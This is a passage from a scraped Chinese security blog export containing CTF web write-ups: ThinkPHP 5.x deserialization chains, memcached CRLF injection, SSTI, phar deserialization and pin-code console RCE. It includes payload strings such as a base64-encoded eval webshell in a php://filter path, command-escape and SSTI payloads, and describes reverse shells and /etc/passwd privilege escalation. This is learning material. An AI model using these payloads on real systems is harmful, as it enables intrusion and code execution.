这也就是为什么要给依赖让我们知道是commons-collections-3.2.1 这里需要知道 这里的ip port是我们在vps起的恶意MySQL服务 也是用这个工具的cli版本即可 除此之外 题目中给的代码是 即会单独传入一个 username 参数, 因此 url 中的 username 会被后面的 username 给覆盖 所以我们用工具生成的payload中user部分要改为username 当然这样还是不行 要将之后的命令执行部分改为适合java的payload 即 至于drive的由来 问了一下GPT 是默认固定的路径 因此最终payload的为：记得要url编码打入 连接我们的恶意mysql服务成功 反弹shell成功 解法二 利用 postgresql 驱动还是利用那个项目工具 生成payload 此时ip和port应该是postgresql的服务而不是mysql 然后xml内容参考PostgresQL JDBC Drive 任意代码执行漏洞(CVE-2022-21724) - 先知社区 用http起一个服务 开放这个xml文件访问 最终payload： 结尾java还是一窍不通 :( 只能硬着头皮复现了"},{"title":"2023强网杯初赛WEB复现学习","date":"2023-12-19T09:44:38.000Z","url":"/post/c9a1b8ba.html","categories":["各赛事WP"],"content":"2023强网杯初赛WEB复现学习 happygame参考Notion – The all-in-one workspace for your notes, tasks, wikis, and databases.然后用以下工具连接 项目地址GitHub - fullstorydev&#x2F;grpcui: An interactive web UI for gRPC, along the lines of postman 之后是打cc6的反序列化链就行了 恶心的是有时候会莫名其妙报错弹不过来 得多打几次 用ysoserial生成文件上传即可 thinkshop解题首先是给了附件 不是直接给了源码包 需要自己docker本地搭一下 根据给的readme搭就行了 搭建好之后直接来看start.sh 这里有一些初始化的操作 查看shop.sql可以发现 账号和密码 密码是123456的md5之后的值 这里有个坑就是登录名不是admin而是1 因为find()在这里去找了主键列查询的是id 登录成功之后通过修改商品信息将序列化的数据利用sql注入存入数据库中 然后在商品展示界面会将我们的data部分数据反序列化 利用点如下 在商品信息更新这里 input函数是一个自定义函数 会接收我们输入值 在这里是$_POST数组 然后会进入Good类中的saveGoods() 我们跟进 到save函数 接着会到Update类中的updatedata() 这里会对我们提交的整个post数组遍历 并且对$key也就是键 未做任何限制以及过滤 存在sql注入 注入形式为 这里还存在一个小点就是因为是键这里存在注入点 因此我们的恶意payload要全部放在键的位置 所以第一个等号要url编码 此次之外php中变量中的空格会被当作非法符号会被转为_因此这里需要/**/来替代空格 报错可以得知是5.0.23的版本 直接找现成的exp 之后我也会调试过一遍这个链子 我分析过写文件的链子 这个直接rce的反而被我忽略了 ThinkPHP5反序列化利用链总结与分析 - FreeBuf网络安全行业门户 这里还有细节 就是如果我们直接用找到的exp是打不通的 会报错 为什么呢 我们来看源码在index.php 这里会调用getGoodsById()这个函数 通过id将商品信息展示出来 我们跟进 这里存在if语句 只有当我们的序列化前三个字符为YTo时候才能正常返回数据 不然就会报错 那么如果我们直接用现成的exp得到的payload 是以Yzo开头的 所以这里相当于是过滤了O开头的序列化数据 因此我们需要用array套一层 成功 thinkphp5.0.x RCE反序列链分析那么我们之前是已经分析过直接写shell文件的链子了 Thinkphp5.0.x~5.2.x版本反序列化链挖掘学习 在这里的链子是直接RCE的 整个链子我愿称之为是5.0.xshell链子的前半段+5.1.xRCE链子的后半段融合版本 前面的链子和5.0.x几乎相同 直到来到Memcached.php write()函数 5.0.x中我们是调用了File类中的set方法去写shell 但是这条链子我们还是继续调用本类中的set方法 我们跟进一下 这里着重关注has()方法 传入的$name是我们可控的变量和&lt;getAttr&gt;xxx&lt;getAttr&gt;拼接的结果 继续跟进 接着会调用$this-&gt;handler-&gt;get方法 可以看到此时$this-&gt;handler为Request对象 那么调过5.1.xrce链子的都会很熟悉这个Request类 我们就是利用这个类来RCE 跟进到Request中的get方法 传入input函数的$this-&gt;get就是我们输入的get传参 继续跟进到getFilter这里我们的filter还是空值 那么就是由这个函数帮我们赋值的 并且$this-&gt;filter可控 跟进获取到filter 之后会被当作命令执行函数调用 最后到了filterValue() 老朋友了 里面存在call_user_func()直接进行命令执行 这么这个链子就算是完成了 整个调用栈为： 参考：2021 0CTF FINAL wp thinkshopping和上一题相同给了附件 先把环境本地搭起来 这一题和上一题不同的是没有了插入账号密码这条数据了 并且反序列化入口地址也被删除了 最重要的是mysql的secure_file_priv为空 那么这个值不为空的时候比如被设置为/var/lib/mysql-files/ 那么用户只能使用 LOAD DATA 和 SELECT ... INTO OUTFILE 将文件保存到或者从/var/lib/mysql-files/ 目录中 为空则表示没有限制了 那么我们就可以用sql注入来任意文件读取了 但关键是我们该如何登录呢 我们再来看一眼start.sh 可以看到是在11211端口启动了memcached 那么这是什么呢 它是一个内存数据库 并且也配置了cache使用memcached做缓存 登录的时候 使用了cache获取缓存 跟进find函数 此处调用了memcache的get指令 并且根据$key = &#39;think:&#39; . $this-&gt;connection-&gt;getConfig(&#39;database&#39;) . &#39;.&#39; . (is_array($options[&#39;table&#39;]) ? key($options[&#39;table&#39;]) : $options[&#39;table&#39;]) . &#39;|&#39; . $data; 缓存的key格式为think:shop.admin|username 那么怎样控制缓存的值 memcached存在CRLF注入漏洞 参考：php-memcached CRLF绕过 - FreeBuf网络安全行业门户 通俗来看就是可以通过set设置任意值 比如 根据大头师傅的方法可以得到memcacged的值的样子[CTF复现计划]2023强网杯初赛 thinkshop[ping] 除此之外根据大头师傅还有坑点： 这里有个坑点，就是memcached本身是没有数据类型的，只有key-value的概念，存放的都是字符串，但是PHP编程语言给它给予了数据类型的概念（当flags为0为字符串，当flags4为数组等等），我们看一下memcached的set命令格式： 上图中的红色箭头所指向的4，就是下方的flags位置，也就是说，在PHP中，flags为4的缓存数据，被当做数组使用 所以我们构造CRLF注入命令要把flags设置为4 也就是数组形式 构造 然后登录抓包修改payload为 参考：学习于各位厉害的师傅 跪拜： [CTF复现计划]2023强网杯初赛 thinkshop[ping] 强网杯 2023 By W&amp;M - W&amp;M Team 2021 0CTF FINAL wp"},{"title":"Thinkphp5.0.x~5.2.x版本反序列化链挖掘学习","date":"2023-12-12T14:31:30.000Z","url":"/post/60ce7176.html","categories":["-漏洞复现"],"content":"Thinkphp5.0.x~5.2.x版本反序列化链挖掘学习 基础知识namespace命名空间和子命名空间首先我们需要知道为什么需要命名空间呢？ 在大型PHP项目中，可能存在大量的类，函数和常量，而这些可能来自不同的库和团队，为了避免冲突，php就引进了命名空间。 以上例子中 Animals就是一个命令空间 而cat dog bird 都是其子命名空间 在创建实例的时候这里也有讲究 一种是直接在相关类之后进行创建实例 比如： 一种是可以在任意地方创建 但是要加上命名空间 即：\\命名空间\\子命令空间\\class类名 还有一个知识点是利用use 在这里可以理解为是require inlcude这样的函数 即可以在当前命名空间使用引入其他命名空间 比如根据代码顺序 我们创建实例的代码都属于是bird命名空间里的 也就是bird无需指定命名空间 直接申明即可 如果使用use 则直接创建实例时无需在之前加上命名空间了 类的继承通过关键字extends来实现 通过一个demo简单理解 可以看到子类会继承父类中的属性和方法，当然只限于（public和protected类型而private是无法继承也无法访问的）子类同名函数会覆盖父类，子类也可以通过parent::method访问父类被覆盖的方法。 trait修饰符trait修饰符使得被修饰的类可以复用，增加了代码的复用性 即我们可以在一个类中包含一个被trait修饰的类 并且使用其方法和属性 还有一个b神例子也可以来理解一下 方便之后去调试thinkphp链子 可以看到我们用trait修饰了Boogipop类并且在Z1d10t中use复用了它 然后我们创建一个Z1d10t的类 并且直接输出他 那么我们知道当直接输出一个对象时候就会调用__toString魔术方法 但是Z1d10t中并没有__toStiring魔术方法而Boogipop类中有却被调用了 这就很神奇了 5.1.x版本分析环境搭建 php7.3.4+Xdebug+thinkphp5.1.37+phpstudy+phpstorm 那么当然是看官方文档 这里建议在安装时老老实实利用composer 用git的时候报了好多错 把下载的源码包放到phpstudy根目录下 然后就是phpstudy联动phpstorm 推荐一篇文章：phpstorm+phpstudy调试thinkphp_如何在phpstorm中调试php程序-CSDN博客 这里遇到的坑就是我composer下载指定thinkphp版本为5.1.37时 他自动下载为thinkphp5.1.42 折磨了我一下午 最终问gpt得到了解决方法 在我们下好thinkphp5.1.42目录下 有个composer.json 将原来的5.1.*改为指定的5.1.37 然后 composer update 他就会自动重新帮我们拉取依赖 最终解决了 可以愉快的调试了 挖掘首先我们需要设置一个触发点 将控制器中的index控制器修改为 然后在反序列化入口函数处打一个断点 先测试我们的poc 可以发现是可以正常触发的 接下来一步步调试 首先是进入了Windows.php的Windows类的析构函数 我们观察poc 也可以发现最外层套的是think\\process\\pipes\\Windows对象 因此首先会进入该对象 这里windows类还继承了Pipes这个抽象类 继续跟进 进入了removeFIles这个函数中 该方法会遍历files数组 然后删除 这里调用了一个$this-&gt;files并且$files是可控的因此这里还存在一个任意文件删除的漏洞 poc： file_exists函数对$filename进行处理 并且此时$filename会被当作字符串string进行处理 并且根据我们的poc可知 我们传入的是 Pivot对象 那当一个对象当作字符串被处理时，会触发__toString魔术方法 继续跟进 发现难道不应该触发Pivot函数的__toString魔术方法吗 为什么会跳到Conversion对象 这里就用到了之前说的trait复用的知识点了 我们可以看到 Convertion被trait修饰了 并且Pivot对象基类是Model 它内部没有toString魔术方法 但是构造函数中调用的是父类的构造方法 我们继续跟进Model类 可以发现它use了model\\concern\\Conversion 因此Model复用了Conversion类 而它又是Pivot类的父类 当Pivot对象被当作字符串输出的时候 就会调用Conversion类的toString方法 这也就是为什么我跟进链子到了 Converison类的tostring方法了 思路清晰 继续 接着调用了toJson函数 接着调用了toArray函数 然后转为了json字符串 继续跟进toArray 先遍历this-&gt;append属性 取出键值对 对应我们poc中的 key为Z1d10t 接着进入getRelation函数中 因为我们没有给$this-&gt;relation赋值 因此return null就结束并且出来了 接着进入getAttr函数 poc中我们将$this-&gt;data赋值为一个对象 因此return一个Request对象之后 就会退出该方法 出来 $relation变为了Request对象 调用$relation-&gt;visible() 并且参数为[calc,calc.exe] 而Requset类是没有visible函数的 因此会调用它的__call方法 一般PHP中的__call方法都是用来进行容错或者是动态调用,所以一般会在__call方法中使用 我们跟进它 发现它调用 call_user_func_array方法 这可不是一个好方法:) 并且这里$hook是我们可控的 因此我们可以设计一个数组$hook= &#123;“visable”=&gt;”任意method”&#125; 但是在这里array_unshift函数在之前的[calc,calc.exe]数组开头中插入Request对象 我们知道call_user_func_array函数会把第一个参数作为回调函数调用，第二参数是一个数组，并且将数组作为回调函数的参数 $this-&gt;hook为一个数组并且我们可控 然后取键名为visible的值 那么我们只能是（偷的） 那这里需要知道的是回调函数不光只是简简单单的普通函数 还可以是对象的方法 包括静态类方法 因此这里就可以理解上述中call_user_func_array中第一个参数函数格式为[$obj,&quot;任意方法&quot;]也就是对象的方法 而参数由于array_unshift函数的缘故第一个为$this也就是一个对象 $obj-&gt;$func($this,$argv)那么直接用这种方式去RCE 很难的拉 此时就要用到了Request类中一个特殊的功能就是过滤器filter 并且ThinkPHP中的多个RCE漏洞都是由于这个过滤器 所以我们可以去尝试覆盖filter方法去RCE 我们先来看看这个filter 该方法调用了call_user_func 但是在这里$value参数不可直接控 继续寻找 发现input函数调用了这个filterValue 但是这里参数仍旧不可控 不能直接使用 那么继续看看谁调用了input 套娃就完事了 那么这里是找到了param函数 不过参数仍旧不可控 继续寻找谁调用了param 找到了 isAjax函数 而isAjax函数中 我们可控$this-&gt;config[&#39;var_pjax&#39;] 意味着param函数中$name可控 意味着input函数中的$name可控 在这里 以上我们说什么可控 什么不可控应该怎么判断呢 可以直接看类属性 类中明确定义了某个属性 那么这个属性我们就可以重写来控制 而param函数可以获得$_GET数组 并且赋值给$this-&gt;param 跟进input 跟进getData 从GET数组中获取键名为Z1d10t的键值 并且返回值就是我们的命令 接着进入getFilter函数获取filter属性 在param函数中filter首先为空 然后在这里用$this-&gt;filter赋值 因此我们可以再poc中重新赋值为system 然后在$filter数组追加一个default 值为null 没大用 然后返回 最后进入filterValue函数 用array_pop弹出数组末尾的元素 因此只剩下了system 然后再调用call_user_func方法 完成RCE ok 让我们再来梳理一下思路 这里我们可以从两个方向正向与反向去分析比较清晰 正向： 反向 偷包浆的图 这个图思路太清晰了 修复直接把__call()方法砍了 后面的链子也就断掉了 5.2.x版本分析这里官方已经把Thinkphp5.2.x升级为Thinkphp6.0因此没法下载5.2.x的源码包 寄 网上找不到相关源码包 之后在6.x分析再回顾吧 可以看这位师傅的thinkphp5.1.x~5.2.x版本反序列化链挖掘分析 - 先知社区 5.0.x版本分析环境搭建 php7.3.4+Xdebug+thinkphp5.0.24+phpstudy+phpstorm 和上面一样准备一个二次反序列化入口 替换/application/index/controller/index.php poc：（影响版本5.0.24和5.0.18，5.0.9不可用） 将生成的payload 在首先给input传参 （原谅这里为什么是thinkphp5.1 只要\\thinkphp\\base.php显示版本是正确的即可） 然后访问/public/a.php3b58a9545013e88c7186db11bb158c44.php 密码为ccc 可见是可以打通的 可以看一下我们写马上去的文件内容 可见不是正常的一句话 里面其实还包括了filterchain的知识点 一句话理解就是利用base64、iconv等编码组合构造出特定的php代码进而完成无需临时文件的RCE 并且可以绕过死亡函数 挖掘首先我们的入口点还是Windows.php的析构函数 前面一部分的链子和5.1.x的差不多 继续跟进 到了removeFiles() 这里还是一样由于直接把对象当作字符串传入file_exists函数 因此导致会触发__toString() 但是和5.1.x的链子不同的是5.0.x的model类有__toSting() 因此不需要use 5.1.x的被trait修饰的Converison类用它的__toString() 继续跟进 到toJson() 然后进到了toArray()函数 这里有四个断点我们需要着重分析 首先这里$relation是通过parseName方法完成的 顺便提一嘴 这里调用方法方式是通过静态方法调用的 那这里我们需要知道$name 的值是通过遍历$this-&gt;append数组赋值的为getError 那这里有个疑惑就是我们poc中是给Pivot类的$this-&gt;append赋值的 为什么这里Model直接用呢 因为Model是Pivot的父类 因此父类可以直接调用子类的protected修饰的属性 ok 我们继续跟进分析一下 这里type=1进入if语句 直接返回getError 此时$relation为getError 继续到 method_exists函数 Model这个类是有getError函数的 因此会进入 这里的error可控 并且我们设置为了HasOne对象 同样poc中也是可以体现出来的 第一个断点至此先说到这里 我们继续跟进第二个断点 是对$value进行赋值 这里有一个很长的if条件语句的判断 我们一部分一部分来看 条件一： 之前我们5.1版本的时候在__toSring这一部分的时候是触发了__call方法，那么我们在这的目标也是去寻找合适的call方法，那么最终是找到了think\\console\\Output我们应该让这个方法返回一个output对象 这样等我们出去之后 执行$value-&gt;getAttr($attr)就会触发__call()；额，因此这里value的值为$this-parent，所以我们需要赋值为一个output对象 条件二： $modelRelation我们已经对它赋值了HasOne对象了 我们跟进isSelfRelation()方法 它是Relation类的一个方法 而OneToOne是它的子类 HasOne是OneToOne的一个子类 因此我们控制HasOne-&gt;selfRelation为false即可 条件三：get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent) 之前我们说到让$this-&gt;parent为一个Output对象即可 因此这里条件成立的就是让$modelRelation-&gt;getModel()返回一个output对象 我们跟进这个函数观察一下 那么思路就是看看哪个类使用了同名getModel函数 并且方法我们可控 那么最后找到是Query类 因此我们这里只需要$this-&gt;query为Query的一个对象即可 那么三个条件均满足 然后$value = $this-&gt;parent我们就出来了 接着进入第三个断点 这里$modelRelation是HasOne对象 调用它的getBindAttr方法 其实它没有 调用的是它的父类OneToOne的方法 返回一个数组[&quot;a&quot;=&gt;&quot;admin&quot;] 出来之后 我们对bindAttr数组做了遍历 取出了admin值 并且赋值给$attr 准备进入__call方法 value为Output对象 attr为admin 继续跟进 用array_unshift函数将方法名也就是getAttr加到参数数组中 最后为[&quot;getAttr&quot;,&quot;admin&quot;] 然后用call_user_func_array()调用自己的block方法 跟进该方法 调用了writeln方法 并且值为我们当作参数传入的数组内容 继续跟进writeln 又调用了write方法 那么我们全局搜索看看谁调用了write函数 在Memcached类找到了合适的write方法 因此让Output类中$this-&gt;handler为Memecached对象即可 这里又调用了set方法 我们继续set方法 最后发现File类中调用了set方法 所以这里我们让Memcache类中的$this-&gt;handler为File对象即可 继续向下走 我们可以看到这里有直接写php🐎的语句 但是有死亡exit()我们可以利用编解码绕过 php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php 这里就不过多赘述了 参考： 然后还有file_put_contents() 危险函数 $filename通过getCacheKey函数获得的 我们跟进 这里的name为我们之前参数数组中两个值getAttr和admin拼接的 然后计算其md5值赋值为$name 为63ac11a7699c5c57d85009296440d77a 接着到$this-&gt;options[&#39;path&#39;] 这里我们是可控的 也就是文件名我们可控 设置为我们的特殊编解码paylaod 文件最终名为$name 也就是之前计算的md5值 再加上$this-&gt;options[&#39;path&#39;]两部分构成的 为php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php63ac11a7699c5c57d85009296440d77a.php 虽然此时我们文件名可控了但是$value为true 也就是文件内容$data我们不可控 继续分析这里会调用setTagItem这个函数 我们跟进观察 该函数又会调用一次set函数 那么此时$value的值我们是可控的 也就是传进来的$name也就是$filename 那么此时传入set的$name为$key=tag_c4ca4238a0b923820dcc509a6f75849b 但是这里还有一个问题 就是exit()死亡函数的绕过 我们写入文件的内容受到这个函数的影响 并且内容就是我们的文件名 因此只需要我们将文件名构造为特殊的可以吞掉exit()的编码即可 所以会生成两个文件 只有第二个文件内容才是我们想要的 并且第二个文件名为&quot;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php3b58a9545013e88c7186db11bb158c44.php&quot;+md5(tag_c4ca4238a0b923820dcc509a6f75849b).php 产出的文件名为：a.php3b58a9545013e88c7186db11bb158c44.php 这里文件名也有讲究 我们可以看到我们的文件名应该是aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php3b58a9545013e88c7186db11bb158c44.php&quot;+md5(tag_c4ca4238a0b923820dcc509a6f75849b).php这一坨才对 最后为什么只生成了我们想要的a.php3b58a9545013e88c7186db11bb158c44.php 我们将前面的一串base64字符整体看作一个目录，虽然没有，但是我们后面重新撤回了原目录，生成a.php3b58a9545013e88c7186db11bb158c44.php文件，从而就可以生成正常的文件名。 参考：探索php伪协议以及死亡绕过 - FreeBuf网络安全行业门户 再偷一份包浆整个流程图片 整理整理思路 至此分析完美撒花 结尾不能只是一味的为了解题而去刷题不去深究真正的漏洞原因 看了很多厉害师傅的博客 深深的e住了 不把屎一样的东西搬出来抽象了 放在雨雀上自己看看就好了 这也是为什么停了博客一个月了qwq，深思中。。。 还有就是期末了 也e 要给时间复习了 参考：ThinkPHP5.x反序列化漏洞全复现 - Boogiepop Doesn’t Laugh thinkphp5.1.x~5.2.x版本反序列化链挖掘分析 - 先知社区 探索php伪协议以及死亡绕过 - FreeBuf网络安全行业门户"},{"title":"NewStar2023 WEB WP","date":"2023-11-01T11:33:46.000Z","url":"/post/dcc8a51b.html","categories":["各赛事WP"],"content":"小阶段完成 前言经过五周的比赛，恭喜NewStar2023(校内赛道)圆满结束了 ★,°:.☆(￣▽￣)&#x2F;$:.°★ 。 这里是Z1d10t的WEB方向题解 3题未解出 还是太菜了qwq 日后会更加努力！ WEEK1ErrorFlask报错之后能看到是flask框架的 然后就能得到源码 Begin of HTTP正常考察请求头参数 Begin of Upload前端检测绕过 泄漏的秘密&#x2F;www.zip源码泄露 Begin of PHPget：?key1[]=1&amp;key2[]=2&amp;key4[]=4&amp;key5=2024%00 post：key3[]=3&amp;flag5[]=1 R!C!E! EasyLogin爆破的时候会获得一条一条的提示 一开始一直以为 这个密码恰如题目简介，一分不多，一分不少的意思是密码9位 但是之后和出题人聊了之后 和这个根本没关系 只想表达是弱口令密码 密码是000000 当然记得要通过md5加密之后再爆破 登录然后放掉这个包 然后还会跳转到一个包 就能获得密码 WEEK2游戏高手修改得分即可 ez_sql手动注个jb sqlmap一把梭就行了 Upload again!考点： htaccess 很基础 Unserialize？考点: php反序列化 include 0。0禁了base所以不能用常用的base64转码了 换种转码方式 再解码 R!!C!!E!!考点: git泄露 无参rce 首先获得源码 得到/bo0g1pop.php路由 得到源码 利用User-Agent字段进行构造rce WEEK3medium_sql考察： sql盲注 直接sqlmap level3梭哈或者自己写个脚本（沙贝是自己） poc: Include考点: pearcmd 根据提示 register_argc_argv是on 那么register_argc_argv是什么呢 简单说 register_argc_argv开启时我们传入get的参数会被记录在$_SERVER这个全局变量数组中 并且$argc变量是⽤于记录数组的⼤⼩ $argv变量是⽤于记录输⼊的参数 条件： ⽼版本（测试版本为5.2.17）默认为 On 新版本（测试版本为 5.4.45、5.5.9、7.3.4）默认为 Off 我们要传入如果正常传入参数，数组的大小永远是1 如果要表示两个数组，需要用+隔开 来自：   一般这个搭配pearcmd使用 写马到网站根目录下 然后包含rce即可 记得要抓一次包重写一下一句话木马 不然会被转码导致不成功 POP Gadget考点： php反序列化 源码如下 exp： GenShin考点： flask ssti 抓包获得 一眼丁真flask ssti注入 直接当脚本小子 或者payload: R!!!C!!!E!!!源码： payload: 反序列化套一下就行了 将读到的flag通过管道符用tee写道网站根目录下 然后访问 关键字通过反斜杠转义来绕过\\ OtenkiGirl考点： nodejs 原型链污染 我是傻逼 关键东西老是看不到 给了源码 根据提示我们只需要关注routes包下的内容即可 也不需要sql注入 info.js submit.js 比较关键的就是这两个文件内容 简单审计一下 它会将我们提交的内容展示出来 并且会经过merge一个合并函数 熟人了 内容包括data,place,contact,reason,timestamp(时间戳) 那么在这里需要污染的点是什么呢 其实在这里给了提示 “他会删除电影上映前的数据” 也就是我们想要的数据在之前的时间里 再看上面||条件语句 存在一个短路 默认min_public_time是2019-07-09 CONFIG.min_public_time默认是无的 不存在 如果CONFIG.min_public_time有值那么短路就不会new default min_public_time的值 那么就需要原型链污染去修改这个CONFIG.min_public_time min_public_time在config.default文件 然后被引入的 格式是这样的 只需要将这个时间改比它默认值小就行了 为什么呢 因为我们之前提交数据的时候会有一个时间戳 这个最小时间戳的生成是由这个CONFIG.min_public_time影响的 所以修改CONFIG.min_public_time就会修改最总时间戳 使其回到之前的时间就能将之前的数据读出来 然后根据代码逻辑 访问/info/一个小值 内容就被打印出来 WEEK4More Fast考点： fast destruct exp 逃一眼丁真 鉴定为反序列化字符串逃逸 考点： 反序列化字符串逃逸 从bad-&gt;good会多出一个字符 那么经过序列化-&gt;waf-&gt;反序列化就会有一个字符逃逸出来 举例执行whoami 将这一串塞入&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;那么就需要26个字符逃逸出来 那么就需要26个bad paylaod：badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125; 其他命令根据字符个数改相应的bad个数调整即可 payload：?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125; flask disk这道题我应该是非预期了 我的做法是 直接上传app.py 内容直接是python命令执行反弹shell 这样会覆盖题目的app.py 直接拿下 知识点：flask开启了debug模式下，app.py源文件被修改后会立刻加载。 PharOne这道题太可惜了 一眼丁真就是phar反序列化利用 当时由于自己开了vpn 导致反弹shell一直过不来 错失良机 考点： phar反序列化 首先给了恶意类 先生成一个phar文件 上传上去之后显示过滤了__HALT_COMPILER 可以通过gzip压缩绕过 来自：php(phar)反序列化漏洞及各种绕过姿势 然后还会检测上传文件后缀名以及mine 当然phar文件后缀名是无关紧要的 不是.phar照样能解析 所以将打包的压缩包改为任意后缀名都行 然后注意这里phar://协议要到Z1d10t.phar 上传上去之后file=phar://upload/f3ccdd27d2000e3f9255a7e3e2c48800.jpg/Z1d10t.phar 记得关vpn 哭死 InjectMe考点: jinja2 ssti 首先是任意文件读取 获得源码： 发现/backdoor 可以进行ssti 但是先获取key 查看源码 可以发现secret是由config引进来的 读取key/download?file=/app/config.py获得secret_key = &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot; 最难绷的就是这个session里面进行ssti payload一多就会爆500错真的让人难绷 能不能对session的获取加个base64编解码。。。 真的会方便很多 还有session伪造的时候转义。。。。编个码吧 payload：&#123;% print(config['_''_cl''ass_''_']['_''_in''it_''_']['_''_glo''bals_''_']['o''s']['pop''en']('head /y0*')['read']()) %&#125;&quot;&#125;&#39; midsql考点: sql时间盲注 这个题目找到自己缺漏的地方了 没咋好好做过时间盲注 导致自己写的脚本注起来太慢了 通过时间差值来判断有时候会不准 最好通过捕获异常的方式进行判断会更准 更好的方式: OtenkiBoy（未解出）不太会 不想代码审计了qwq WEEK5Unserialize Again考点： phar反序列化 phar重签名 源码如下： 非预期非预期了 由于没有控制路径 直接写马到网站根目录就行了 之后看看预期解学习 预期解看了官方文档预期解来了 考察的phar重签名的知识点 首先恶意类利用很简单 只需要__wakeup和__destruct即可 __wakeup通过修改类属性个数绕过即可 这里就涉及到一个phar重签名的问题 因为我们的恶意payload是在phar文件中 生成phar之后修改类属性个数 按照官方WP phar的最后有一段signature，是phar的签名，放在文件末尾，要注意因为我们修改了文件的内容，之前的签名就会无效，所以需要更换一个新的签名 修改签名脚本如下： 然后将修改签名后的文件内容读出来url编码之后通过post传进去 再通过phar://协议读取即可成功rce 但是我没复现成功 我反弹shell去看上传的文件内容也没错 但是就是不得解 不知道什么原因 用官方WP中的脚本 也不成功 Final报错发现是thinkphp5.0.23 那么可以直接根据版本去找漏洞利用 这里当时为了抢一血直接用工具梭哈了 写马到网站根目录下 发现禁了system 那么我们用passthru或者exec等无回显函数都可以 反正我们要进行反弹shell 记得payload要url编码一下 发现权限不够 涉及提权 那一般是考察suid提权 看看哪些命令有suid 有cp 呢铁定是cp提权了 直接把内容复制到&#x2F;etc&#x2F;passwd 然后拿flag pppython?这道题目应该借鉴的是SCTF2023的pypyp？ 考点： ssrf flask pin码计算 gopher协议 做这道题目之前庆幸学习了0xgame2023一道ssrf打redis主从复制题目 学习Aecous师傅的的WP:) 师傅太强力ORZ 源码如下： 首先根据题目获取提示 拿到了&#x2F;目录下的文件情况 可以醒目的发现app.py 那么通过file伪协议去读取文件?url=[]=1 app.py 可以看到我们要么能获取key伪造session 但是同时我们还得有地方去调用这个welcome函数才行 仔细观察它的debug是开启的 并且我们还可以读文件 那么一眼就知道是要去算pin码然后rce了 前面的内容只是噱头 计算pin码 这里关于/proc/self/cgroup这里的内容和我们一般做题时获取的不太一样 不过记住一点就行了 取第一行的最后一个斜杠/后面的所有字符串那么肯定是对的 计算得pin码 397-838-235 接下来的思路就是 要通过gopher协议去访问内网中/console路由并且进行RCE 但是由于debugmode的rce需要携带cookie 所以我们还需要去计算cookie 因为/console是在内网的1314端口中 所以我们没法直接通过浏览器进入debug的控制台 这里就需要手算cookie了 方法参考：flask-pin 神！[SCTF2023 Web WriteUp - Boogiepop Doesn’t Laugh]( Web WriteUp&#x2F;) 发送验证pin码的请求 需要拿到s 直接访问&#x2F;console 可以在源代码中拿到 然后记得编码打入?url=[]=1 验证pin码计算正确的 然后我们要进行rce还需要携带cookie 第一种方式 脚本计算需要计算cookie 这里直接用到一个现成的脚本：GitHub - WiIs0n&#x2F;Flask-cookie-generation-based-on-PIN-code: This script generates a Cookie based on a legitimate PIN code. 同时可以计算出pin和cookie 第二种方式gopher发包利用gopher协议发包 通过返回包获取到cookie 脚本如下 可见我们通过脚本计算出来的 cookie也是正确的 计算出cookie之后就不用携带pin了 携带cookie直接rce即可 直接反弹shell 记得url编码一下 成功！！！ NextDrive最折磨出题人的一集 趣味题目 一个模拟百度网盘的题目 首先申请一个账号然后登录 根据提示 Hint2: 你知道秒传的原理吗？ 那么首先了解一下秒传的原理 在公共资源区能找到test.res.http文件 可以看到是发包数据包 注意到还有一个test.req.http上传了但是文件没有显示出来 所以我们可以利用秒传的原理随便上传一个文件 下载时替换test.req.http的哈希值 那么就可以将test.req.http文件下载下来了 得到 那么我们就拿到了admin的token了 然后替换token伪造身份 又多了点文件 不过重要的是share.js 这里就稍稍寄了 由于js题目做的少 看js代码逻辑很吃力 最后还是折磨出题师傅出的qwq hash_fn是整个文件的hash hash取了hash_fn前64个字符校验是否是分享的文件 如果是则会将文件内容读出来 但是问题出在了 它校验时是否为分享文件取的是hash 但是读文件是通过hash_fn 那么我们可以让前64个hash值为任意分享的文件hash值 之后的内容为../../../../../proc/self/environ 就可以将内容读出来 payload：/s/任意分享文件的hash值/../../../../../proc/self/environ?from_uid=100000&amp;fn=/proc/self/environ 记得要url编码 不然会混淆导致重定向到主页&#x2F;(ㄒoㄒ)&#x2F;~~ 4-复盘(未解出)原来这个题考pearcmd啊🤔 跟着官方wp学习 index.php关键代码 存在文件包含 然后就直接payload🤔🤔 之后是一个suid提权 gzip的 🤔🤔 Ye’s Pickle（未解出)找到原题了 不敢实践。。。rz 原题是祥云杯2022 的FunWEB 考点： jwt伪造 pickle反序列化 源码: 简单审计 可以看到我们的role为admin时 我们才能进行pickle反序列化利用 题中鉴权是靠jwt来实现的 那么生成过程是 如果get获取到token 那么jwt中session[&quot;role&quot;]就为我们输入token的role 如果token为空 那么他会帮我自动生成jwt 并且将session[&quot;role&quot;]初始化为guest 然后是jwt crack的一个新出的漏洞 这里jwt加密是靠rsa加密 利用这个脚本 可以不需要公私钥就可以伪造jwt 项目地址：  简单修改一下 把里面改为parsed_payload[&#39;role&#39;] = &#39;admin&#39; 即可 之后就是一个很简单的pickle反序列化了 不再赘述 结尾一起共勉 "},{"title":"SHCTF-校外赛道 WEB WP","date":"2023-10-31T11:43:02.000Z","url":"/post/cb61c260.html","categories":["各赛事WP"],"content":"查缺补漏 WEEK1babyRCE 登录就给flag弱口令 admin&#x2F;password 飞机大战unicode解码再base64解码 ez_serialize考点: nginx日志包含 php反序列化 ezphp考点:  1zzphp考点: 正则回溯 生成你的邀请函把~题目一开始没描述清楚 也有人做出来。。 挺抽象的 我还以为是CRLF 傻逼 WEEK2serialize考点： 反序列化 引用运算符 array绕过正则 